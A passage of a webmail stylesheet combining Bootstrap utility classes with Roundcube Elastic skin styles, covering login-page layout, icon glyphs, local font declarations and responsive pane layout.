,.px-md-3{padding-right:1rem!important}.pb-md-3,.py-md-3{padding-bottom:1rem!important}.pl-md-3,.px-md-3{padding-left:1rem!important}.p-md-4{padding:1.5rem!important}.pt-md-4,.py-md-4{padding-top:1.5rem!important}.pr-md-4,.px-md-4{padding-right:1.5rem!important}.pb-md-4,.py-md-4{padding-bottom:1.5rem!important}.pl-md-4,.px-md-4{padding-left:1.5rem!important}.p-md-5{padding:3rem!important}.pt-md-5,.py-md-5{padding-top:3rem!important}.pr-md-5,.px-md-5{padding-right:3rem!important}.pb-md-5,.py-md-5{padding-bottom:3rem!important}.pl-md-5,.px-md-5{padding-left:3rem!important}.m-md-n1{margin:-.25rem!important}.mt-md-n1,.my-md-n1{margin-top:-.25rem!important}.mr-md-n1,.mx-md-n1{margin-right:-.25rem!important}.mb-md-n1,.my-md-n1{margin-bottom:-.25rem!important}.ml-md-n1,.mx-md-n1{margin-left:-.25rem!important}.m-md-n2{margin:-.5rem!important}.mt-md-n2,.my-md-n2{margin-top:-.5rem!important}.mr-md-n2,.mx-md-n2{margin-right:-.5rem!important}.mb-md-n2,.my-md-n2{margin-bottom:-.5rem!important}.ml-md-n2,.mx-md-n2{margin-left:-.5rem!important}.m-md-n3{margin:-1rem!important}.mt-md-n3,.my-md-n3{margin-top:-1rem!important}.mr-md-n3,.mx-md-n3{margin-right:-1rem!important}.mb-md-n3,.my-md-n3{margin-bottom:-1rem!important}.ml-md-n3,.mx-md-n3{margin-left:-1rem!important}.m-md-n4{margin:-1.5rem!important}.mt-md-n4,.my-md-n4{margin-top:-1.5rem!important}.mr-md-n4,.mx-md-n4{margin-right:-1.5rem!important}.mb-md-n4,.my-md-n4{margin-bottom:-1.5rem!important}.ml-md-n4,.mx-md-n4{margin-left:-1.5rem!important}.m-md-n5{margin:-3rem!important}.mt-md-n5,.my-md-n5{margin-top:-3rem!important}.mr-md-n5,.mx-md-n5{margin-right:-3rem!important}.mb-md-n5,.my-md-n5{margin-bottom:-3rem!important}.ml-md-n5,.mx-md-n5{margin-left:-3rem!important}.m-md-auto{margin:auto!important}.mt-md-auto,.my-md-auto{margin-top:auto!important}.mr-md-auto,.mx-md-auto{margin-right:auto!important}.mb-md-auto,.my-md-auto{margin-bottom:auto!important}.ml-md-auto,.mx-md-auto{margin-left:auto!important}}@media (min-width:992px){.m-lg-0{margin:0!important}.mt-lg-0,.my-lg-0{margin-top:0!important}.mr-lg-0,.mx-lg-0{margin-right:0!important}.mb-lg-0,.my-lg-0{margin-bottom:0!important}.ml-lg-0,.mx-lg-0{margin-left:0!important}.m-lg-1{margin:.25rem!important}.mt-lg-1,.my-lg-1{margin-top:.25rem!important}.mr-lg-1,.mx-lg-1{margin-right:.25rem!important}.mb-lg-1,.my-lg-1{margin-bottom:.25rem!important}.ml-lg-1,.mx-lg-1{margin-left:.25rem!important}.m-lg-2{margin:.5rem!important}.mt-lg-2,.my-lg-2{margin-top:.5rem!important}.mr-lg-2,.mx-lg-2{margin-right:.5rem!important}.mb-lg-2,.my-lg-2{margin-bottom:.5rem!important}.ml-lg-2,.mx-lg-2{margin-left:.5rem!important}.m-lg-3{margin:1rem!important}.mt-lg-3,.my-lg-3{margin-top:1rem!important}.mr-lg-3,.mx-lg-3{margin-right:1rem!important}.mb-lg-3,.my-lg-3{margin-bottom:1rem!important}.ml-lg-3,.mx-lg-3{margin-left:1rem!important}.m-lg-4{margin:1.5rem!important}.mt-lg-4,.my-lg-4{margin-top:1.5rem!important}.mr-lg-4,.mx-lg-4{margin-right:1.5rem!important}.mb-lg-4,.my-lg-4{margin-bottom:1.5rem!important}.ml-lg-4,.mx-lg-4{margin-left:1.5rem!important}.m-lg-5{margin:3rem!important}.mt-lg-5,.my-lg-5{margin-top:3rem!important}.mr-lg-5,.mx-lg-5{margin-right:3rem!important}.mb-lg-5,.my-lg-5{margin-bottom:3rem!important}.ml-lg-5,.mx-lg-5{margin-left:3rem!important}.p-lg-0{padding:0!important}.pt-lg-0,.py-lg-0{padding-top:0!important}.pr-lg-0,.px-lg-0{padding-right:0!important}.pb-lg-0,.py-lg-0{padding-bottom:0!important}.pl-lg-0,.px-lg-0{padding-left:0!important}.p-lg-1{padding:.25rem!important}.pt-lg-1,.py-lg-1{padding-top:.25rem!important}.pr-lg-1,.px-lg-1{padding-right:.25rem!important}.pb-lg-1,.py-lg-1{padding-bottom:.25rem!important}.pl-lg-1,.px-lg-1{padding-left:.25rem!important}.p-lg-2{padding:.5rem!important}.pt-lg-2,.py-lg-2{padding-top:.5rem!important}.pr-lg-2,.px-lg-2{padding-right:.5rem!important}.pb-lg-2,.py-lg-2{padding-bottom:.5rem!important}.pl-lg-2,.px-lg-2{padding-left:.5rem!important}.p-lg-3{padding:1rem!important}.pt-lg-3,.py-lg-3{padding-top:1rem!important}.pr-lg-3,.px-lg-3{padding-right:1rem!important}.pb-lg-3,.py-lg-3{padding-bottom:1rem!important}.pl-lg-3,.px-lg-3{padding-left:1rem!important}.p-lg-4{padding:1.5rem!important}.pt-lg-4,.py-lg-4{padding-top:1.5rem!important}.pr-lg-4,.px-lg-4{padding-right:1.5rem!important}.pb-lg-4,.py-lg-4{padding-bottom:1.5rem!important}.pl-lg-4,.px-lg-4{padding-left:1.5rem!important}.p-lg-5{padding:3rem!important}.pt-lg-5,.py-lg-5{padding-top:3rem!important}.pr-lg-5,.px-lg-5{padding-right:3rem!important}.pb-lg-5,.py-lg-5{padding-bottom:3rem!important}.pl-lg-5,.px-lg-5{padding-left:3rem!important}.m-lg-n1{margin:-.25rem!important}.mt-lg-n1,.my-lg-n1{margin-top:-.25rem!important}.mr-lg-n1,.mx-lg-n1{margin-right:-.25rem!important}.mb-lg-n1,.my-lg-n1{margin-bottom:-.25rem!important}.ml-lg-n1,.mx-lg-n1{margin-left:-.25rem!important}.m-lg-n2{margin:-.5rem!important}.mt-lg-n2,.my-lg-n2{margin-top:-.5rem!important}.mr-lg-n2,.mx-lg-n2{margin-right:-.5rem!important}.mb-lg-n2,.my-lg-n2{margin-bottom:-.5rem!important}.ml-lg-n2,.mx-lg-n2{margin-left:-.5rem!important}.m-lg-n3{margin:-1rem!important}.mt-lg-n3,.my-lg-n3{margin-top:-1rem!important}.mr-lg-n3,.mx-lg-n3{margin-right:-1rem!important}.mb-lg-n3,.my-lg-n3{margin-bottom:-1rem!important}.ml-lg-n3,.mx-lg-n3{margin-left:-1rem!important}.m-lg-n4{margin:-1.5rem!important}.mt-lg-n4,.my-lg-n4{margin-top:-1.5rem!important}.mr-lg-n4,.mx-lg-n4{margin-right:-1.5rem!important}.mb-lg-n4,.my-lg-n4{margin-bottom:-1.5rem!important}.ml-lg-n4,.mx-lg-n4{margin-left:-1.5rem!important}.m-lg-n5{margin:-3rem!important}.mt-lg-n5,.my-lg-n5{margin-top:-3rem!important}.mr-lg-n5,.mx-lg-n5{margin-right:-3rem!important}.mb-lg-n5,.my-lg-n5{margin-bottom:-3rem!important}.ml-lg-n5,.mx-lg-n5{margin-left:-3rem!important}.m-lg-auto{margin:auto!important}.mt-lg-auto,.my-lg-auto{margin-top:auto!important}.mr-lg-auto,.mx-lg-auto{margin-right:auto!important}.mb-lg-auto,.my-lg-auto{margin-bottom:auto!important}.ml-lg-auto,.mx-lg-auto{margin-left:auto!important}}@media (min-width:1200px){.m-xl-0{margin:0!important}.mt-xl-0,.my-xl-0{margin-top:0!important}.mr-xl-0,.mx-xl-0{margin-right:0!important}.mb-xl-0,.my-xl-0{margin-bottom:0!important}.ml-xl-0,.mx-xl-0{margin-left:0!important}.m-xl-1{margin:.25rem!important}.mt-xl-1,.my-xl-1{margin-top:.25rem!important}.mr-xl-1,.mx-xl-1{margin-right:.25rem!important}.mb-xl-1,.my-xl-1{margin-bottom:.25rem!important}.ml-xl-1,.mx-xl-1{margin-left:.25rem!important}.m-xl-2{margin:.5rem!important}.mt-xl-2,.my-xl-2{margin-top:.5rem!important}.mr-xl-2,.mx-xl-2{margin-right:.5rem!important}.mb-xl-2,.my-xl-2{margin-bottom:.5rem!important}.ml-xl-2,.mx-xl-2{margin-left:.5rem!important}.m-xl-3{margin:1rem!important}.mt-xl-3,.my-xl-3{margin-top:1rem!important}.mr-xl-3,.mx-xl-3{margin-right:1rem!important}.mb-xl-3,.my-xl-3{margin-bottom:1rem!important}.ml-xl-3,.mx-xl-3{margin-left:1rem!important}.m-xl-4{margin:1.5rem!important}.mt-xl-4,.my-xl-4{margin-top:1.5rem!important}.mr-xl-4,.mx-xl-4{margin-right:1.5rem!important}.mb-xl-4,.my-xl-4{margin-bottom:1.5rem!important}.ml-xl-4,.mx-xl-4{margin-left:1.5rem!important}.m-xl-5{margin:3rem!important}.mt-xl-5,.my-xl-5{margin-top:3rem!important}.mr-xl-5,.mx-xl-5{margin-right:3rem!important}.mb-xl-5,.my-xl-5{margin-bottom:3rem!important}.ml-xl-5,.mx-xl-5{margin-left:3rem!important}.p-xl-0{padding:0!important}.pt-xl-0,.py-xl-0{padding-top:0!important}.pr-xl-0,.px-xl-0{padding-right:0!important}.pb-xl-0,.py-xl-0{padding-bottom:0!important}.pl-xl-0,.px-xl-0{padding-left:0!important}.p-xl-1{padding:.25rem!important}.pt-xl-1,.py-xl-1{padding-top:.25rem!important}.pr-xl-1,.px-xl-1{padding-right:.25rem!important}.pb-xl-1,.py-xl-1{padding-bottom:.25rem!important}.pl-xl-1,.px-xl-1{padding-left:.25rem!important}.p-xl-2{padding:.5rem!important}.pt-xl-2,.py-xl-2{padding-top:.5rem!important}.pr-xl-2,.px-xl-2{padding-right:.5rem!important}.pb-xl-2,.py-xl-2{padding-bottom:.5rem!important}.pl-xl-2,.px-xl-2{padding-left:.5rem!important}.p-xl-3{padding:1rem!important}.pt-xl-3,.py-xl-3{padding-top:1rem!important}.pr-xl-3,.px-xl-3{padding-right:1rem!important}.pb-xl-3,.py-xl-3{padding-bottom:1rem!important}.pl-xl-3,.px-xl-3{padding-left:1rem!important}.p-xl-4{padding:1.5rem!important}.pt-xl-4,.py-xl-4{padding-top:1.5rem!important}.pr-xl-4,.px-xl-4{padding-right:1.5rem!important}.pb-xl-4,.py-xl-4{padding-bottom:1.5rem!important}.pl-xl-4,.px-xl-4{padding-left:1.5rem!important}.p-xl-5{padding:3rem!important}.pt-xl-5,.py-xl-5{padding-top:3rem!important}.pr-xl-5,.px-xl-5{padding-right:3rem!important}.pb-xl-5,.py-xl-5{padding-bottom:3rem!important}.pl-xl-5,.px-xl-5{padding-left:3rem!important}.m-xl-n1{margin:-.25rem!important}.mt-xl-n1,.my-xl-n1{margin-top:-.25rem!important}.mr-xl-n1,.mx-xl-n1{margin-right:-.25rem!important}.mb-xl-n1,.my-xl-n1{margin-bottom:-.25rem!important}.ml-xl-n1,.mx-xl-n1{margin-left:-.25rem!important}.m-xl-n2{margin:-.5rem!important}.mt-xl-n2,.my-xl-n2{margin-top:-.5rem!important}.mr-xl-n2,.mx-xl-n2{margin-right:-.5rem!important}.mb-xl-n2,.my-xl-n2{margin-bottom:-.5rem!important}.ml-xl-n2,.mx-xl-n2{margin-left:-.5rem!important}.m-xl-n3{margin:-1rem!important}.mt-xl-n3,.my-xl-n3{margin-top:-1rem!important}.mr-xl-n3,.mx-xl-n3{margin-right:-1rem!important}.mb-xl-n3,.my-xl-n3{margin-bottom:-1rem!important}.ml-xl-n3,.mx-xl-n3{margin-left:-1rem!important}.m-xl-n4{margin:-1.5rem!important}.mt-xl-n4,.my-xl-n4{margin-top:-1.5rem!important}.mr-xl-n4,.mx-xl-n4{margin-right:-1.5rem!important}.mb-xl-n4,.my-xl-n4{margin-bottom:-1.5rem!important}.ml-xl-n4,.mx-xl-n4{margin-left:-1.5rem!important}.m-xl-n5{margin:-3rem!important}.mt-xl-n5,.my-xl-n5{margin-top:-3rem!important}.mr-xl-n5,.mx-xl-n5{margin-right:-3rem!important}.mb-xl-n5,.my-xl-n5{margin-bottom:-3rem!important}.ml-xl-n5,.mx-xl-n5{margin-left:-3rem!important}.m-xl-auto{margin:auto!important}.mt-xl-auto,.my-xl-auto{margin-top:auto!important}.mr-xl-auto,.mx-xl-auto{margin-right:auto!important}.mb-xl-auto,.my-xl-auto{margin-bottom:auto!important}.ml-xl-auto,.mx-xl-auto{margin-left:auto!important}}.stretched-link::after{position:absolute;top:0;right:0;bottom:0;left:0;z-index:1;pointer-events:auto;content:"";background-color:rgba(0,0,0,0)}.text-monospace{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace!important}.text-justify{text-align:justify!important}.text-wrap{white-space:normal!important}.text-nowrap{white-space:nowrap!important}.text-truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.text-left{text-align:left!important}.text-right{text-align:right!important}.text-center{text-align:center!important}@media (min-width:576px){.text-sm-left{text-align:left!important}.text-sm-right{text-align:right!important}.text-sm-center{text-align:center!important}}@media (min-width:768px){.text-md-left{text-align:left!important}.text-md-right{text-align:right!important}.text-md-center{text-align:center!important}}@media (min-width:992px){.text-lg-left{text-align:left!important}.text-lg-right{text-align:right!important}.text-lg-center{text-align:center!important}}@media (min-width:1200px){.text-xl-left{text-align:left!important}.text-xl-right{text-align:right!important}.text-xl-center{text-align:center!important}}.text-lowercase{text-transform:lowercase!important}.text-uppercase{text-transform:uppercase!important}.text-capitalize{text-transform:capitalize!important}.font-weight-light{font-weight:300!important}.font-weight-lighter{font-weight:lighter!important}.font-weight-normal{font-weight:400!important}.font-weight-bold{font-weight:700!important}.font-weight-bolder{font-weight:bolder!important}.font-italic{font-style:italic!important}.text-white{color:#fff!important}.text-primary{color:#007bff!important}a.text-primary:focus,a.text-primary:hover{color:#0056b3!important}.text-secondary{color:#6c757d!important}a.text-secondary:focus,a.text-secondary:hover{color:#494f54!important}.text-success{color:#28a745!important}a.text-success:focus,a.text-success:hover{color:#19692c!important}.text-info{color:#17a2b8!important}a.text-info:focus,a.text-info:hover{color:#0f6674!important}.text-warning{color:#ffc107!important}a.text-warning:focus,a.text-warning:hover{color:#ba8b00!important}.text-danger{color:#dc3545!important}a.text-danger:focus,a.text-danger:hover{color:#a71d2a!important}.text-light{color:#f8f9fa!important}a.text-light:focus,a.text-light:hover{color:#cbd3da!important}.text-dark{color:#343a40!important}a.text-dark:focus,a.text-dark:hover{color:#121416!important}.text-body{color:#212529!important}.text-muted{color:#6c757d!important}.text-black-50{color:rgba(0,0,0,.5)!important}.text-white-50{color:rgba(255,255,255,.5)!important}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.text-decoration-none{text-decoration:none!important}.text-break{word-break:break-word!important;word-wrap:break-word!important}.text-reset{color:inherit!important}.visible{visibility:visible!important}.invisible{visibility:hidden!important}@media print{*,::after,::before{text-shadow:none!important;box-shadow:none!important}a:not(.btn){text-decoration:underline}abbr[title]::after{content:" (" attr(title) ")"}pre{white-space:pre-wrap!important}blockquote,pre{border:1px solid #adb5bd;page-break-inside:avoid}thead{display:table-header-group}img,tr{page-break-inside:avoid}h2,h3,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}@page{size:a3}body{min-width:992px!important}.container{min-width:992px!important}.navbar{display:none}.badge{border:1px solid #000}.table{border-collapse:collapse!important}.table td,.table th{background-color:#fff!important}.table-bordered td,.table-bordered th{border:1px solid #dee2e6!important}.table-dark{color:inherit}.table-dark tbody+tbody,.table-dark td,.table-dark th,.table-dark thead th{border-color:#dee2e6}.table .thead-dark th{color:inherit;border-color:#dee2e6}}
/* settings icons */
.listing.iconized li.autoresponder > a:before { content:"\f122"; }
.listing.iconized li.spam > a:before { content:"\f1f8"; }
.listing.iconized li.forwarding > a:before { content:"\f064"; }
.listing.iconized li.pwrecovery > a:before { content:"\f13e"; }
.listing.iconized li.external_access > a:before { content:"\f35d"; }
.listing.iconized li.pop3fetcher > a:before { content:"\f199"; }

/* taskmenu icons */
#taskmenu a.admin:before { content:"\f509"; }
#taskmenu a.rss:before { content:"\f1ea"; }

/* other icons */
.menu a.button.markasjunk2:before { content:"\f7e4"; }
.menu a.button.markasnotjunk2:before { content:"\f06a"; }
.menu a.allow:before { content:"\f164"; }
.menu a.block:before { content:"\f165"; }
#taskmenu a.button-help:before { content: "\f1cd"; }
#taskmenu a.button-feedback:before { content: "\f075"; }

/* icon for unread messages */
#layout-list .messagelist td.subject span.msgicon.status.unread:before { content: "\f0e0"; font-size: 1rem; }
#layout-list .messagelist td.subject span.size {font-size: 90%; padding-left: 10px; color: #737677;}
/* calendar tweaks */
#edit-attendees-invite { display: none; }
#calendarslist span.actions { display: none; }

/* settings tweaks */
fieldset.skin { display: none; }

/* hide password recovery setup in mobile until it works there */
@media only screen and (max-width: 490px) {
  .listitem.pwrecovery { display: none; }
  #messagelist td.selection { display: none; }
}

/* handle small height screens that can't show all sidebar icons */
@media only screen and (min-width: 1025px) and (max-height: 800px) {
  .menu #taskmenu a { height: 3.45rem; font-size: 0.9rem; }
}
@media only screen and (min-width: 1025px) and (max-height: 680px) {
  .menu #taskmenu a { height: 3.15rem; font-size: 0.8rem; }
}




body { background: #4d4d4d; overflow: auto !important;}
.box-inner { background: white; width: 480px; padding: 30px 38px 48px 38px; }
#login-logo { width: 480px; margin-bottom: 20px; margin-top: 40px; }
/* default login logo is vector */
#login-logo object { display: block; margin-left: auto; margin-right: auto; }

/* custom login logos are raster */
#login-logo img { display: block; margin-left: auto; margin-right: auto; }
#login-logo img.small { display: none; }

/* for old mobile UI */
#mobiletest { display: none; }

.box-inner .table td { border: none; }
.box-inner p { margin-bottom: 0; padding-left: 10px; margin-top: 3px; }
.input-group-prepend { display: none; }
table#loginform .input-group { flex-wrap: unset; }
div#login-form { margin-left: auto; margin-right: auto; width: 480px; max-width: 480px; position: unset; }
#login-form form .formbuttons button { margin-left: auto; margin-right: auto; display: block; height: 40px; width: 200px; font-size: 18px; }
.table td.pair-top { padding-bottom: 0; }
.table td.pair-bottom { padding-top: 0; }
.spacer-bottom { padding-bottom: 13px; }
.box-bottom { margin-left: auto; margin-right: auto; width: 480px; }
#message .alert, #message2 .alert { border-radius: 0; }
#message .ui.alert, #message2 .ui.alert { background-color: #EC1313; color: white; justify-content: center; }
#message .ui.alert.alert-warning, #message2 .ui.alert.alert-warning { background-color: #EC1313; }
#message .ui.alert.alert-info, #message2 .ui.alert.alert-info { background-color: darkgrey; }
#message .ui.alert.alert-warning > i.icon:before, #message2 .ui.alert.alert-warning > i.icon:before { color: white; }
#message .ui.alert.alert-info > i.icon:before, #message2 .ui.alert.alert-info > i.icon:before { color: white; }
.pwrecover { margin-top: 20px; padding-left: 0.75rem; }
#loginform .input-group>.form-control { border-radius: 3px; height: 32px; }
#loginmodal .input-group>.form-control { border-radius: 3px; height: 32px; }

#login-form .modal_underlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; z-index: 10; background: black; opacity: 0.5; }
#login-form .modal { position: fixed; z-index: 20; background: white; width: 448px; padding: 22px 38px 48px 38px; top: 120px; display: block; height: 234px; left: auto; margin-left: -22px; }
#login-form .modalheader { position: fixed; z-index: 20; background: white; color:black; width: 448px; height: 70px; top: 50px; font-size: 20px; left: auto; margin-left: -22px; }
#login-form .modalheader center { margin-top: 40px; }
table#loginmodal { margin-bottom: 40px; }
#login-form .modalmessage { position: fixed; z-index: 20; background: white; width: 448px; margin-left: -22px; top: 354px; }

/* for IE/edge/safari */
#loginform .input-group>.form-control { width: 100%; }

/* for IE */
div#login-form { top: 0px; }

@media only screen and (max-width: 768px) {
  #mobiletest { display: inline-block; height: 1px; width:1px; }
}

@media only screen and (max-width: 490px) {
  #mobiletest { display: inline-block; height: 1px; width:1px; }
  body { background: white; overflow: auto !important; }
  #login-logo { width: 100%; background: #4d4d4d; margin-top: 0; margin-bottom: 10px; padding: 13px 0 13px 0; position: fixed; top:0px; margin: 0; }
  div#login-form { width: 100%; max-width: 100%; margin: 0; top: 0; }
  .box-inner { width: 100%; padding: 10px 10px 0 10px; margin-top: 30px; }
  .spacer-bottom { padding-bottom: 5px; }
  .box-bottom { margin-left: auto; margin-right: auto; width: 480px; }
  .pwrecover { margin-top: 10px; margin-bottom: 10px; }
  table#loginform td { padding-bottom: 0px; }
  #message { position: fixed; bottom: 0; width: 100%; }
  #login-form .modalmessage { position: fixed; bottom: 0; width: 100%; margin-left: 0; top: auto; }
  #login-form .modalheader { margin-left: 0; }
  #login-form .modalheader center { width: 90%; white-space: normal; }
  #login-form #loginmodal td.pair-top { width: 100%; }
  #login-form #loginmodal td.pair-bottom input { width: 250px; }
  #login-form .modal { width: 100%; margin-left: 0; top: 150px; padding: 0; }
  #login-form .modalheader.ui-dialog button { display: block !important; }
  #login-logo object { height: 18px; }
  #login-logo img.small { display: block; }
  #login-logo img.large { display: none; }
  #login-logo img.resize { height: 18px; }
}

body {background: white;}




/**
 * Roundcube Webmail styles for the Elastic skin
 *
 * Copyright (c) The Roundcube Dev Team
 *
 * The contents are subject to the Creative Commons Attribution-ShareAlike
 * License. It is allowed to copy, distribute, transmit and to adapt the work
 * by keeping credits to the original authors in the README.md file.
 * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
 */
/**
 * Roundcube webmail styles for the Elastic skin
 *
 * Copyright (c) 2017-2018, The Roundcube Dev Team
 *
 * The contents are subject to the Creative Commons Attribution-ShareAlike
 * License. It is allowed to copy, distribute, transmit and to adapt the work
 * by keeping credits to the original authors in the README.md file.
 * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
 */
 p.image-attachment .attachment-links a:before,
 .quota-widget:before,
 .table-widget table.options-table td:not(:first-child) span:before,
 table.table th.checkbox-cell:before,
 a.button.icon:before,
 button.btn:before,
 .floating-action-buttons a.button:before,
 .ui-dialog .ui-dialog-titlebar-close:before,
 .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset a.btn-link.options:before,
 .ui-datepicker .ui-datepicker-prev:before,
 .ui-datepicker .ui-datepicker-next:before,
 .pgpkeyimport div.key label.keyid + a:before,
 .pgpkeyimport li.uid:before,
 .menu a:before,
 .popover .menu li a[aria-haspopup]:after,
 .searchbar form:before,
 .searchbar a:before,
 .ui.alert > i.icon:before,
 .listing td.action a:before,
 .listing.iconized li a:before,
 .listing.iconized li > i:before,
 .listing.iconized tr td:before,
 .listing.iconized.selectable li a:before,
 ul.treelist li div.treetoggle:before,
 .folderlist li a:before,
 .messagelist tr.thread td.threads div:before,
 .messagelist td.subject span.msgicon.status:before,
 .messagelist span.attachment span,
 .messagelist span.flagged:before,
 .messagelist tr:hover span.unflagged:before,
 .contactlist td.contact:before,
 .contactlist td.contactgroup:before,
 .contactlist li a:before,
 .attachmentslist li:before,
 .attachmentslist li a.cancelupload:before,
 .attachmentslist li a.delete:before,
 .keylist li:before,
 #identities-table td.mail:before,
 #responses-table td.name:before,
 #filterslist td.name:before,
 #filtersetslist td.name:before,
 .propform td.rowbuttons a:before,
 fieldset.advanced > legend:after,
 .input-group .icon:before,
 .multi-input a.icon.reset:before,
 .tagedit-list li.tagedit-listelement-old a:before,
 .mce-window .mce-window-head .mce-close:before,
 .mce-window .mce-foot .mce-container-body .mce-btn button:before,
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after,
 .mce-window .mce-checkbox i.mce-i-checkbox:before,
 .googie_list li .googie_list_revert:before,
 .googie_list li .googie_add_to_dict:before,
 body.status-flagged #message-header .subject:before,
 #message-header .subject a.extwin:before,
 #message-header .short-header div.header-links a:before,
 .message-part blockquote span.blockquote-link:after,
 .message-htmlpart blockquote span.blockquote-link:after {
   font-size: 1.25em;display: block;float: left;margin: 0 0.25rem 0 0;width: 1.18em;height: 1em;font-family: 'Icons';font-style: normal;font-weight: 900;text-decoration: inherit;text-align: center;speak: none;font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;-webkit-font-smoothing: antialiased;
 }
 /*** Fonts ***/
 @font-face {
   font-family: 'Icons';
   font-style: normal;
   font-weight: 900;
   src: url("/skins/elastic/fonts/fa-solid-900.woff2") format('woff2'), url("/skins/elastic/fonts/fa-solid-900.woff") format('woff');
 }
 @font-face {
   font-family: 'Icons';
   font-style: normal;
   font-weight: 400;
   src: url("/skins/elastic/fonts/fa-regular-400.woff2") format('woff2'), url("/skins/elastic/fonts/fa-regular-400.woff") format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: normal;
   font-weight: 400;
   src: local('Roboto'), local('Roboto-Regular'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-regular.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-regular.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: italic;
   font-weight: 400;
   src: local('Roboto Italic'), local('Roboto-Italic'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-italic.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-italic.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: normal;
   font-weight: 700;
   src: local('Roboto Bold'), local('Roboto-Bold'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700.woff') format('woff');
 }
 @font-face {
   font-family: 'Roboto';
   font-style: italic;
   font-weight: 700;
   src: local('Roboto Bold Italic'), local('Roboto-BoldItalic'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700italic.woff2') format('woff2'), url('/skins/elastic/fonts/roboto-v18-greek-ext_cyrillic-ext_cyrillic_greek_latin-ext_latin-700italic.woff') format('woff');
 }
 /* Reset some Bootstrap style */
 body,
 button,
 input,
 optgroup,
 select,
 textarea,
 .popover {
   font-family: Roboto, sans-serif;
 }
 button,
 input,
 select,
 textarea {
   line-height: initial;
 }
 input {
   vertical-align: middle;
 }
 a {
   color: #0099cc;
 }
 a:hover {
   color: #007399;
 }
 a.disabled {
   pointer-events: none;
 }
 a.disabled:not(.btn) {
   opacity: 0.5;
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Responsive design - Layout ***/
 /*
 - Large screen (width > 1200px)
    -----------------------------------------------------------------------------------------------------
    |  menu  |        sidebar        |         list          |                 content                  |
    -----------------------------------------------------------------------------------------------------
 - Normal screen (1200px => width => 768px) - typical: 768x1024 (iPad Mini/Air)
    -------------------------------------------------------------------
    |menu|    sidebar/list     |               content                |
    -------------------------------------------------------------------
 - Small (480px < width < 768px)
    ------------------------------------------
    |menu|     sidebar/list/content          |
    ------------------------------------------
 - Phone (width <= 480px) - typical: 320x480 (iPhone 5), 375x667 (iPhone 6-7), 360x564 (Galaxy S6)
    ------------------------
    | sidebar/list/content |
    ------------------------
 */
 html {
   height: 100%;
   font-size: 14px;
 }
 body {
   min-width: 240px;
   height: 100%;
   color: #2c363a;
   overflow: hidden;
 }
 html.iframe body {
   overflow: auto;
 }
 #layout {
   overflow: hidden;
   display: flex;
   height: 100%;
   width: 100%;
 }
 #layout > div > .scroller {
   flex: 1;
   position: relative;
 }
 #layout > div > .header,
 #layout > div > .footer {
   font-size: 1rem;
   font-weight: bold;
   line-height: 58px;
   height: 58px;
   min-height: 58px;
   padding: 0 0.25em;
   margin: 0;
   position: relative;
   overflow: hidden;
   white-space: nowrap;
   display: flex;
   justify-content: center;
 }
 #layout > div > .header {
   border-bottom: 1px solid #d4dbde;
   color: #2c363a;
   background-color: #cfdee6;
 }
 #layout > div > .header .header-title {
   overflow: hidden;
   text-overflow: ellipsis;
   flex: 1;
   text-align: center;
   margin: 0 -20rem;
 }
 #layout > div > .header a.button {
   color: #2c363a;
 }
 #layout > div > .header a.toolbar-list-button,
 #layout > div > .header a.toolbar-menu-button {
   order: 99;
 }
 #layout > div > .footer {
   border-top: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout > div > .footer.small {
   height: 35px;
   min-height: 35px;
   line-height: 35px;
 }
 #layout > div > .footer:empty {
   display: none;
 }
 #layout-sidebar {
   display: flex;
   flex-direction: column;
   flex: 2;
   max-width: 30%;
   min-width: 220px;
   border-right: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout-sidebar.sidebar-right {
   order: 2;
   border-right: 0;
   border-left: 1px solid #d4dbde;
   flex: 3;
 }
 #layout-list {
   display: flex;
   flex-direction: column;
   flex: 3;
   max-width: 30%;
   min-width: 300px;
   border-right: 1px solid #d4dbde;
   background-color: #fff;
 }
 #layout-content {
   display: flex;
   flex: 6;
   flex-direction: column;
   min-width: 50%;
   background-color: #fff;
 }
 html.iframe #layout-content {
   height: 100%;
 }
 #layout-content > .formcontent,
 #layout-content > .content {
   height: 100%;
   width: 100%;
   overflow: auto;
   flex: 1;
 }
 #layout-content .iframe-wrapper {
   width: 100%;
   flex: 1;
 }
 #layout-content .iframe-wrapper iframe {
   width: 100%;
   height: 100%;
   border: 0;
 }
 #layout-content.only > .scroller {
   overflow: auto;
 }
 #layout-menu.popover {
   left: 0 !important;
 }
 #layout-menu .popover-header {
   height: 58px;
   line-height: 58px;
   border: 0;
   border-radius: 0;
   text-align: center;
 }
 #layout-menu .popover-header img {
   max-height: 58px;
   max-width: 78px;
   padding: 0.25rem;
 }
